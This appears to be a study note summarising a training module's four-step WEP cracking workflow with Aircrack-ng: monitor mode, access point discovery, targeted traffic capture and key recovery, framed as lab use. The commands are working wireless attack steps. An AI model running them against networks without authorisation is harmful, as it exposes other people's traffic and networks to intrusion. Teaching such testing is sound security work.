
# WEP Encryption Cracking

## Introduction

WEP (Wired Equivalent Privacy) is an older wireless security algorithm.

The module describes a workflow for testing WEP encryption using the Aircrack-ng Suite.

## WEP Cracking Workflow

The following steps describe the WEP testing workflow presented in the module. These commands should only be used in an authorized wireless security lab.

### Step 1: Enable Monitor Mode

Put the wireless network interface into monitor mode:

```bash
airmon-ng start wlan0
```

### Step 2: Discover Wireless Access Points

Use Airodump-ng to discover nearby wireless Access Points:

```bash
airodump-ng wlan0
```

### Step 3: Capture Wireless Traffic

Identify an Access Point using WEP encryption and obtain its channel and MAC address.

Then capture wireless traffic:

```bash
airodump-ng -w <capture-file-name> -c <channel-number> --bssid <AP-MAC-address> wlan0
```

### Step 4: Crack WEP Encryption

The module recommends waiting until approximately 10,000 to 30,000 data packets have been collected between clients and the Access Point.

Then use Aircrack-ng with the captured file:

```bash
aircrack-ng <capture-file-name>
```

## Summary

The WEP testing workflow presented in the module consists of:

1. Enabling monitor mode.
2. Discovering wireless Access Points.
3. Capturing wireless traffic.
4. Using Aircrack-ng to attempt to crack WEP encryption.

## Related Links

- [Aircrack-ng Documentation](https://www.aircrack-ng.org/documentation.html)
- [Aircrack-ng Suite](https://www.aircrack-ng.org/)
